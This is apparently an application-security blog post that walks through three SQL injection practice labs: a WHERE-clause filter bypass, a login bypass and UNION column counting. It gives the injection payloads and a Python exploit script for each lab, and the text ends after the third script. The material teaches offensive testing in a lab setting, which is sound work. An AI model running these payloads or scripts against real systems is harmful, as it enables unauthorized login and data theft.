<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.4.1" /><meta property="og:title" content="SQL Injection - Labs" /><meta property="og:locale" content="en" /><meta name="description" content="Lab 1 - SQL injection vulnerability in WHERE clause allowing retrieval of hidden data We need to retrieve hidden data so we search query’s in the web where we can inject some sql injection payloads" /><meta property="og:description" content="Lab 1 - SQL injection vulnerability in WHERE clause allowing retrieval of hidden data We need to retrieve hidden data so we search query’s in the web where we can inject some sql injection payloads" /><link rel="canonical" href="https://s4yhii.github.io/posts/SQL-Injection-Labs/" /><meta property="og:url" content="https://s4yhii.github.io/posts/SQL-Injection-Labs/" /><meta property="og:site_name" content="s4yhii’s Blog" /><meta property="og:image" content="https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/Portswigger/sqli.png" /><meta property="og:image:height" content="1100" /><meta property="og:image:width" content="500" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-01-25T11:00:00-05:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/Portswigger/sqli.png" /><meta property="twitter:title" content="SQL Injection - Labs" /><meta name="twitter:site" content="@s4yhii" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-07-30T14:34:27-05:00","datePublished":"2022-01-25T11:00:00-05:00","description":"Lab 1 - SQL injection vulnerability in WHERE clause allowing retrieval of hidden data We need to retrieve hidden data so we search query’s in the web where we can inject some sql injection payloads","headline":"SQL Injection - Labs","image":{"height":1100,"width":500,"url":"https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/Portswigger/sqli.png","@type":"imageObject"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://s4yhii.github.io/posts/SQL-Injection-Labs/"},"url":"https://s4yhii.github.io/posts/SQL-Injection-Labs/"}</script><title>SQL Injection - Labs | s4yhii's Blog</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="s4yhii's Blog"><meta name="application-name" content="s4yhii's Blog"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto"> <img src="https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/streams/dance-pikachu.gif" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">s4yhii's Blog</a></div><div class="site-subtitle font-italic">Appsec blog, CTF write-ups and more</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/s4yhii" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/s4yhii" aria-label="twitter" target="_blank" rel="noopener"> <i class="fa-brands fa-x-twitter"></i> </a> <a href="https://www.linkedin.com/in/jesusluj4n" aria-label="linkedin" target="_blank" rel="noopener"> <i class="fab fa-linkedin"></i> </a> <a href="https://app.hackthebox.com/profile/274780" aria-label="HackTheBox" target="_blank" rel="noopener"> <i class="fas fa-cube"></i> </a></div></div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>SQL Injection - Labs</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container pl-xl-4 pr-xl-4"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2"><h1 data-toc-skip>SQL Injection - Labs</h1><div class="post-meta text-muted"> <span> Posted <em class="" data-ts="1643126400" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Jan 25, 2022 </em> </span> <span> Updated <em class="" data-ts="1659209667" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Jul 30, 2022 </em> </span><div class="mt-3 mb-3"> <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 500 1100'%3E%3C/svg%3E" data-src="https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/Portswigger/sqli.png" class="preview-img bg" alt="Preview Image" width="500" height="1100" data-proofer-ignore></div><div class="d-flex justify-content-between"> <span> By <em> <a href="https://twitter.com/s4yhii">Jesus Lujan</a> </em> </span><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="3255 words"> <em>18 min</em> read</span></div></div></div><div class="post-content"><h2 id="lab-1---sql-injection-vulnerability-in-where-clause-allowing-retrieval-of-hidden-data"><span class="mr-2">Lab 1 - SQL injection vulnerability in WHERE clause allowing retrieval of hidden data</span><a href="#lab-1---sql-injection-vulnerability-in-where-clause-allowing-retrieval-of-hidden-data" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>We need to retrieve hidden data so we search query’s in the web where we can inject some sql injection payloads</p><p><img data-src="https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/Portswigger/sqli4.jpg" alt="" data-proofer-ignore></p><p>We can see that the request is filtering the data by category, and we are asked to show the hidden elements, so we assume that there is a parameter that hides the elements.</p><p>We try the following payload that will show the elements of all categories and we will comment out the rest of the query so that it does not filter by hidden or visible elements:</p><div class="language-sql highlighter-rouge"><div class="code-header"> <span data-label-text="Sql"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">products</span> <span class="k">WHERE</span> <span class="n">category</span><span class="o">=</span><span class="s1">'Tech gifts'</span><span class="k">or</span> <span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="c1">--</span>
</pre></table></code></div></div><p>This payload will comment everything else from the query, so it will show us all the elements, released or unreleased.</p><p><img data-src="https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/Portswigger/sqli5.jpg" alt="" data-proofer-ignore></p><p>With this we can see the hidden data and finish the lab.</p><h3 id="lab-1-python-script"><span class="mr-2">Lab 1 Python Script</span><a href="#lab-1-python-script" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>With this script the sql injection process is done automatically based on the fact that we already know the manual output, in this case we verify that the object “3D Voice Assistant” is in the web response and don´t forget to set the proxies.</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="n">requests</span>
<span class="kn">import</span> <span class="n">sys</span>
<span class="kn">import</span> <span class="n">urllib3</span>
<span class="n">urllib3</span><span class="p">.</span><span class="nf">disable_warnings</span><span class="p">(</span><span class="n">urllib3</span><span class="p">.</span><span class="n">exceptions</span><span class="p">.</span><span class="n">InsecureRequestWarning</span><span class="p">)</span>
<span class="n">proxies</span> <span class="o">=</span> <span class="p">{</span><span class="sh">'</span><span class="s">http</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">http://127.0.0.1:8080</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">https</span><span class="sh">'</span><span class="p">:</span><span class="sh">'</span><span class="s">http://127.0.0.1:8080</span><span class="sh">'</span><span class="p">}</span>

<span class="k">def</span> <span class="nf">exploit_sqli</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">payload</span><span class="p">):</span>
    <span class="n">uri</span><span class="o">=</span><span class="sh">'</span><span class="s">/filter?category=</span><span class="sh">'</span>
    <span class="n">r</span><span class="o">=</span><span class="n">requests</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">url</span><span class="o">+</span><span class="n">uri</span><span class="o">+</span><span class="n">payload</span><span class="p">,</span><span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">proxies</span><span class="o">=</span><span class="n">proxies</span><span class="p">)</span>
    <span class="k">if</span> <span class="sh">'</span><span class="s">3D Voice Assistants</span><span class="sh">'</span> <span class="ow">in</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">:</span>
        <span class="k">return</span> <span class="bp">True</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="bp">False</span>

       
<span class="k">if</span> <span class="n">__name__</span><span class="o">==</span><span class="sh">"</span><span class="s">__main__</span><span class="sh">"</span><span class="p">:</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">url</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="nf">strip</span><span class="p">()</span>
        <span class="n">payload</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">].</span><span class="nf">strip</span><span class="p">()</span>
    <span class="k">except</span> <span class="nb">IndexError</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">Usage: %s &lt;url&gt; &lt;payload&gt;</span><span class="sh">'</span> <span class="o">%</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
        <span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">Example: %s www.example-com </span><span class="sh">"</span><span class="s">1=1</span><span class="sh">"'</span> <span class="o">%</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
        <span class="n">sys</span><span class="p">.</span><span class="nf">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
    <span class="k">if</span> <span class="nf">exploit_sqli</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">payload</span><span class="p">):</span>
        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">SQL Injection Successfull</span><span class="sh">"</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Injection Failed, try again</span><span class="sh">"</span><span class="p">)</span>
</pre></table></code></div></div><h2 id="lab-2---sql-injection-vulnerability-allowing-login-bypass"><span class="mr-2">Lab 2 - SQL injection vulnerability allowing login bypass</span><a href="#lab-2---sql-injection-vulnerability-allowing-login-bypass" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>In this lab we will use the same idea as in the first lab, we will discuss the validation of the password in the query to let us log in as administrator with only the username with this payload <code class="language-plaintext highlighter-rouge">admnistrator'--</code> and the query would look like this:</p><div class="language-sql highlighter-rouge"><div class="code-header"> <span data-label-text="Sql"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">users</span> <span class="k">WHERE</span> <span class="n">username</span><span class="o">=</span><span class="s1">'administrator'</span><span class="c1">--' and password='something'</span>
</pre></table></code></div></div><p>This payload will comment the password validation and only will verify the correct username, in this case they give us this hint.</p><h3 id="lab-2-python-script"><span class="mr-2">Lab 2 Python Script</span><a href="#lab-2-python-script" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>With this script the sql injection process is done automatically based on the fact that we already know the manual output, in this case we verify that the object “3D Voice Assistant” is in the web response and don´t forget to set the proxies.</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="n">requests</span>
<span class="kn">import</span> <span class="n">sys</span>
<span class="kn">import</span> <span class="n">urllib3</span>
<span class="n">urllib3</span><span class="p">.</span><span class="nf">disable_warnings</span><span class="p">(</span><span class="n">urllib3</span><span class="p">.</span><span class="n">exceptions</span><span class="p">.</span><span class="n">InsecureRequestWarning</span><span class="p">)</span>
<span class="n">proxies</span> <span class="o">=</span> <span class="p">{</span><span class="sh">'</span><span class="s">http</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">http://127.0.0.1:8080</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">https</span><span class="sh">'</span><span class="p">:</span><span class="sh">'</span><span class="s">http://127.0.0.1:8080</span><span class="sh">'</span><span class="p">}</span>
<span class="n">a_session</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nc">Session</span><span class="p">()</span>

<span class="k">def</span> <span class="nf">exploit_sqli</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">payload</span><span class="p">):</span>
    <span class="n">uri</span><span class="o">=</span><span class="sh">'</span><span class="s">/login</span><span class="sh">'</span>
    <span class="n">r</span><span class="o">=</span><span class="n">a_session</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">url</span><span class="o">+</span><span class="n">uri</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="sh">'</span><span class="s">username</span><span class="sh">'</span><span class="p">:</span><span class="n">payload</span><span class="p">,</span> <span class="sh">'</span><span class="s">password</span><span class="sh">'</span><span class="p">:</span><span class="sh">'</span><span class="s">a</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">csrf</span><span class="sh">'</span><span class="p">:</span><span class="sh">'</span><span class="s">EDWeHPACH8bS0tDjAm7gCWzRdGPPYdGT</span><span class="sh">'</span><span class="p">},</span><span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">proxies</span><span class="o">=</span><span class="n">proxies</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="p">{</span><span class="sh">'</span><span class="s">session</span><span class="sh">'</span><span class="p">:</span><span class="sh">'</span><span class="s">mnSlrxs2JjbmuE7icjEsJHJKgswWnkA5</span><span class="sh">'</span><span class="p">})</span>
    <span class="k">if</span> <span class="sh">'</span><span class="s">Log out</span><span class="sh">'</span> <span class="ow">in</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">:</span>
        <span class="k">return</span> <span class="bp">True</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="bp">False</span>

       
<span class="k">if</span> <span class="n">__name__</span><span class="o">==</span><span class="sh">"</span><span class="s">__main__</span><span class="sh">"</span><span class="p">:</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">url</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="nf">strip</span><span class="p">()</span>
        <span class="n">payload</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">].</span><span class="nf">strip</span><span class="p">()</span>
    <span class="k">except</span> <span class="nb">IndexError</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">Usage: %s &lt;url&gt; &lt;payload&gt;</span><span class="sh">'</span> <span class="o">%</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
        <span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">Example: %s www.example-com </span><span class="sh">"</span><span class="s">1=1</span><span class="sh">"'</span> <span class="o">%</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
        <span class="n">sys</span><span class="p">.</span><span class="nf">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
    <span class="k">if</span> <span class="nf">exploit_sqli</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">payload</span><span class="p">):</span>
        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">SQL Injection Successfull</span><span class="sh">"</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Injection Failed, try again</span><span class="sh">"</span><span class="p">)</span>    
</pre></table></code></div></div><p>For this script to work we need the session cookie and the csrf token that we get by intercepting the post with burpsuite.</p><h2 id="lab-3---sql-injection-union-attack-determining-the-number-of-columns-returned-by-the-query"><span class="mr-2">Lab 3 - SQL injection UNION attack, determining the number of columns returned by the query</span><a href="#lab-3---sql-injection-union-attack-determining-the-number-of-columns-returned-by-the-query" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>In this lab we have to find out the number of columns that has the table of objects displayed on the web, in this case is filtering by category, but we will use UNION and NULL VALUES to determine how many columns exist, for that we will use as an example <code class="language-plaintext highlighter-rouge">UNION SELECT NULL, NULL --</code>, which will add to the query null fields for each column found.</p><p>The query will look something like this</p><div class="language-sql highlighter-rouge"><div class="code-header"> <span data-label-text="Sql"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">PRODUCTS</span> <span class="k">WHERE</span> <span class="n">category</span><span class="o">=</span><span class="s1">'Gifts'</span><span class="k">UNION</span> <span class="k">SELECT</span> <span class="k">NULL</span><span class="p">,</span> <span class="k">NULL</span><span class="p">,</span> <span class="k">NULL</span><span class="c1">--</span>
</pre></table></code></div></div><p>If the response returns a 504 error, it means that there is a syntax error, that happens because there are more columns than null fields, then you will have to add more null fields until they are equal.</p><p><img data-src="https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/Portswigger/sqli6.jpg" alt="" data-proofer-ignore></p><p>As you can see the objective is to return an error 200, this way we know that the number of columns in the table is equal to the number of null fields we have added.</p><h3 id="lab-3-python-script"><span class="mr-2">Lab 3 Python Script</span><a href="#lab-3-python-script" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>With this script we will be automating the request to achieve sql injection, it is based on adding null values until it returns the response code 200, which means that the number of null values is equal to the number of columns in the table.</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
</pre><td class="rouge-code"><pre>
<span class="kn">import</span> <span class="n">requests</span>
<span class="kn">import</span> <span class="n">sys</span>
<span class="kn">import</span> <span class="n">urllib3</span>
<span class="n">urllib3</span><span class="p">.</span><span class="nf">disable_warnings</span><span class="p">(</span><span class="n">urllib3</span><span class="p">.</span><span class="n">exceptions</span><span class="p">.</span><span class="n">InsecureRequestWarning</span><span class="p">)</span>
<span class="n">proxies</span> <span class="o">=</span> <span class="p">{</span><span class="sh">'</span><span class="s">http</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">http://127.0.0.1:8080</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">https</span><span class="sh">'</span><span class="p">:</span><span class="sh">'</span><span class="s">http://127.0.0.1:8080</span><span class="sh">'</span><span class="p">}</span>
<span class="k">def</span> <span class="nf">exploit_sqli</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">payload</span><span class="p">):</span>
    <span class="n">uri</span><span class="o">=</span><span class="sh">"</span><span class="s">filter?category=Gifts</span><span class="sh">"</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range </span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">10</span><span class="p">):</span>
        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">The url for request is: </span><span class="sh">"</span><span class="o">+</span><span class="n">url</span><span class="o">+</span><span class="n">uri</span><span class="o">+</span><span class="n">payload</span><span class="o">+</span><span class="sh">"</span><span class="s">--</span><span class="sh">"</span><span class="p">)</span>
        <span class="n">r</span><span class="o">=</span><span class="n">requests</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">url</span><span class="o">+</span><span class="n">uri</span><span class="o">+</span><span class="n">payload</span><span class="o">+</span><span class="sh">"</span><span class="s">--</span><span class="sh">"</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">proxies</span><span class="o">=</span><span class="n">proxies</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">r</span><span class="p">.</span><span class="n">status_code</span><span class="o">==</span><span class="mi">200</span><span class="p">:</span>
            <span class="k">return</span> <span class="n">i</span>
        <span class="n">payload</span><span class="o">+=</span><span class="sh">"</span><span class="s">,+NULL</span><span class="sh">"</span>
    <span class="k">return</span> <span class="bp">False</span>

<span class="k">if</span> <span class="n">__name__</span><span class="o">==</span><span class="sh">"</span><span class="s">__main__</span><span class="sh">"</span><span class="p">:</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">url</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="nf">strip</span><span class="p">()</span>
        <span class="n">payload</span> <span class="o">=</span> <span class="sh">"'</span><span class="s">UNION+SELECT+NULL</span><span class="sh">"</span>
    <span class="k">except</span> <span class="nb">IndexError</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">Usage: %s &lt;url&gt; </span><span class="sh">'</span> <span class="o">%</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
        <span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">Example: %s www.example-com </span><span class="sh">'</span> <span class="o">%</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
        <span class="n">sys</span><span class="p">.</span><span class="nf">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
    <span class="n">columns</span><span class="o">=</span><span class="nf">exploit_sqli</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">columns</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">SQL Injection Successfull, the number of columns are {columns}</span><span class="sh">"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">columns</span><span class="o">=</span><span class="nf">str</span><span class="p">(</span><span class="n">columns</span><span class="p">)))</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Injection Failed, try again</span><span class="sh">"</span><span class="p">)</span>   
